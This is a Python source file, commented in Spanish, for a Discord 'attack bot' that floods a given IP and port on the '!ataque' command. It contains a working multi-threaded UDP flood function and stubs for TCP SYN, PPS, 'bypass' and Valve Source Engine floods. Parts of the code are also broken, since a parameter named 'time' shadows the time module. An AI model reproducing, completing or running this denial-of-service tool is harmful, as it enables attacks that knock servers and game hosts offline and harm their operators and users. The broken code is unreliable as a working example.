import discord
from discord.ext import commands
import asyncio
import socket
import random
import threading
import time  # Importa la biblioteca time
from colorama import Fore, Style, init
import os #Importar os para verificar la variable de entorno

# Inicializa colorama para soporte de colores en la consola
init()

# Configuración general
TOKEN_FILE = "token.txt"
THREADS = 5  # Número de hilos para ataques multi-hilo

# Colores para la GUI
GREEN = Fore.GREEN
RED = Fore.RED
YELLOW = Fore.YELLOW
BLUE = Fore.BLUE
RESET = Style.RESET_ALL

# Funciones para leer y guardar el token (como antes)
def leer_token():
    try:
        with open(TOKEN_FILE, "r") as f:
            return f.read().strip()
    except FileNotFoundError:
        return None

def guardar_token(token):
    with open(TOKEN_FILE, "w") as f:
        f.write(token)

# Obtener el token
token = leer_token()
if not token:
    #token = input(f"{YELLOW}Por favor, introduce el token de tu bot de Discord:{RESET} ") #Eliminar esta linea
    #guardar_token(token) #Eliminar esta linea
    print(f"{RED}No se encontró el token en el archivo o en la variable de entorno. El bot no se iniciará correctamente.{RESET}") #Mostrar alerta

#Verificar si la variable de entorno DISCORD_TOKEN está presente
if 'DISCORD_TOKEN' in os.environ:
    token = os.environ['DISCORD_TOKEN']
    print(f"{GREEN}Token obtenido de la variable de entorno DISCORD_TOKEN{RESET}")
else:
    print(f"{RED}La variable de entorno DISCORD_TOKEN no está configurada. El bot no se iniciará correctamente.{RESET}")
    exit() #Salir del programa

# Configuración del bot
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

# --- Funciones de Ataque (ESQUELETOS) ---

def udp_flood(ip, port, time, stop_event):
    """Ataque UDP Flood básico con un tamaño de paquete fijo."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(1024)  # Tamaño fijo de 1024 bytes
        start_time = time.time()
        while time.time() - start_time < time and not stop_event.is_set():
            sock.sendto(bytes, (ip, port))
        sock.close()
    except Exception as e:
        print(f"{RED}Error en UDP Flood: {e}{RESET}")

def tcp_flood(ip, port, time, stop_event):
    """Esqueleto de ataque TCP Flood SYN/ACK."""
    try:
        # Implementar la lógica de SYN/ACK aquí
        print(f"{YELLOW}TCP Flood (SYN/ACK) a {ip}:{port} durante {time} segundos (ESQUELETO){RESET}")
        # **IMPORTANTE: Requiere lógica de socket TCP y gestión de SYN/ACK**
        start_time = time.time()
        while time.time() - start_time < time and not stop_event.is_set():
            # Coloca aqui la logica del socket
            pass
    except Exception as e:
        print(f"{RED}Error en TCP Flood: {e}{RESET}")

def udppps_flood(ip, port, time, stop_event):
    """Esqueleto de ataque UDP PPS (paquetes por segundo)."""
    try:
        # Implementar la lógica de PPS aquí
        print(f"{YELLOW}UDP PPS Flood a {ip}:{port} durante {time} segundos (ESQUELETO){RESET}")
        # **IMPORTANTE: Requiere lógica de control de tasa de paquetes**
        start_time = time.time()
        while time.time() - start_time < time and not stop_event.is_set():
             # Coloca aqui la logica del socket
            pass
    except Exception as e:
        print(f"{RED}Error en UDP PPS Flood: {e}{RESET}")

def udp_bypass(ip, port, time, stop_event):
    """Esqueleto de ataque UDP Bypass (requiere conocimientos especializados)."""
    try:
        # Implementar la lógica de UDP Bypass aquí (requiere conocimientos avanzados)
        print(f"{YELLOW}UDP Bypass Flood a {ip}:{port} durante {time} segundos (ESQUELETO){RESET}")
        # **IMPORTANTE: Requiere conocimientos profundos de protocolos y filtros de red**
        start_time = time.time()
        while time.time() - start_time < time and not stop_event.is_set():
             # Coloca aqui la logica del socket
            pass
    except Exception as e:
        print(f"{RED}Error en UDP Bypass Flood: {e}{RESET}")

def vse_flood(ip, port, time, stop_event):
    """Esqueleto de ataque VSE (Valve Source Engine) Flood."""
    try:
        # Implementar la lógica de VSE Flood aquí (específico de Valve Source Engine)
        print(f"{YELLOW}VSE Flood a {ip}:{port} durante {time} segundos (ESQUELETO){RESET}")
        # **IMPORTANTE: Requiere conocimientos del protocolo VSE**
        start_time = time.time()
        while time.time() - start_time < time and not stop_event.is_set():
             # Coloca aqui la logica del socket
            pass
    except Exception as e:
        print(f"{RED}Error en VSE Flood: {e}{RESET}")

def home_flood(ip, port, time, stop_event):
    """Esqueleto de ataque HOME Flood (inventado, sin significado real)."""
    try:
        # Implementar la lógica de HOME Flood aquí (inventado)
        print(f"{YELLOW}HOME Flood a {ip}:{port} durante {time} segundos (ESQUELETO){RESET}")
        # **IMPORTANTE: Este método es un ejemplo inventado**
        start_time = time.time()
        while time.time() - start_time < time and not stop_event.is_set():
             # Coloca aqui la logica del socket
            pass
    except Exception as e:
        print(f"{RED}Error en HOME Flood: {e}{RESET}")

# --- Eventos y Comandos de Discord ---

@bot.event
async def on_ready():
    print(f"{BLUE}Bot conectado como {bot.user.name}{RESET}")
    print(f"{BLUE}¡Listo para atacar!{RESET}")

@bot.command()
async def ayuda(ctx):
    """Muestra la ayuda."""
    await ctx.send(f"""
{GREEN}¡Bienvenido al bot de ataque!{RESET}

{YELLOW}Comandos disponibles:{RESET}
`!ayuda`: Muestra este mensaje de ayuda.
`!methods`: Muestra los métodos de ataque disponibles.
`!ataque <metodo> <ip> <puerto> <tiempo>`: Inicia un ataque.

{YELLOW}Ejemplo:{RESET}
`!ataque udp 127.0.0.1 80 10` (Inicia un ataque UDP a 127.0.0.1 en el puerto 80 durante 10 segundos)
""")

@bot.command()
async def methods(ctx):
    """Muestra los métodos de ataque disponibles."""
    await ctx.send(f"""
{YELLOW}Métodos de ataque disponibles:{RESET}
`udp`: Ataque UDP Flood básico.
`tcp`: Ataque TCP Flood SYN/ACK (ESQUELETO).
`udppps`: Ataque UDP PPS (paquetes por segundo) (ESQUELETO).
`udpbypass`: Ataque UDP Bypass (ESQUELETO, requiere conocimientos avanzados).
`vse`: Ataque VSE (Valve Source Engine) Flood (ESQUELETO).
`home`: Ataque HOME Flood (ESQUELETO, ejemplo inventado).
""")

@bot.command()
async def ataque(ctx, method=None, ip=None, port: int = None, time: int = None):
    """Inicia un ataque."""
    if not all([method, ip, port, time]):
        await ctx.send(f"{RED}Faltan parámetros. Uso: `!ataque <metodo> <ip> <puerto> <tiempo>`{RESET}")
        return

    try:
        socket.inet_aton(ip)  # Validar IP
    except socket.error:
        await ctx.send(f"{RED}La IP proporcionada no es válida.{RESET}")
        return

    if not (1 <= port <= 65535):
        await ctx.send(f"{RED}El puerto debe estar entre 1 y 65535.{RESET}")
        return

    if time <= 0:
        await ctx.send(f"{RED}El tiempo debe ser mayor a cero.{RESET}")
        return

    stop_event = threading.Event()  # Para detener los hilos

    # Iniciar ataque en múltiples hilos
    threads = []
    print(f"{GREEN}Iniciando ataque {method} a {ip}:{port} durante {time} segundos en {THREADS} hilos...{RESET}")
    await ctx.send(f"{GREEN}Iniciando ataque {method} a {ip}:{port} durante {time} segundos...{RESET}")
    start_time = time.time()  # Registrar el tiempo de inicio

    try:
        for _ in range(THREADS):
            if method == "udp":
                thread = threading.Thread(target=udp_flood, args=(ip, port, time, stop_event))
            elif method == "tcp":
                thread = threading.Thread(target=tcp_flood, args=(ip, port, time, stop_event))
            elif method == "udppps":
                thread = threading.Thread(target=udppps_flood, args=(ip, port, time, stop_event))
            elif method == "udpbypass":
                thread = threading.Thread(target=udp_bypass, args=(ip, port, time, stop_event))
            elif method == "vse":
                thread = threading.Thread(target=vse_flood, args=(ip, port, time, stop_event))
            elif method == "home":
                thread = threading.Thread(target=home_flood, args=(ip, port, time, stop_event))
            else:
                await ctx.send(f"{RED}Método de ataque no válido.{RESET}")
                return

            threads.append(thread)
            thread.start()

        # Esperar a que termine el ataque (o se detenga manualmente)
        for thread in threads:
            thread.join()

        end_time = time.time()  # Registrar el tiempo de finalización
        duration = end_time - start_time  # Calcular la duración real

        print(f"{GREEN}Ataque {method} a {ip}:{port} finalizado después de {duration:.2f} segundos.{RESET}")
        await ctx.send(f"{GREEN}Ataque {method} a {ip}:{port} finalizado después de {duration:.2f} segundos.{RESET}")

    except Exception as e:
        print(f"{RED}Ocurrió un error durante el ataque: {e}{RESET}")
        await ctx.send(f"{RED}Ocurrió un error durante el ataque: {e}{RESET}")
    finally:
        stop_event.set()  # Asegurar que todos los hilos se detengan
# Iniciar el bot
bot.run(token)
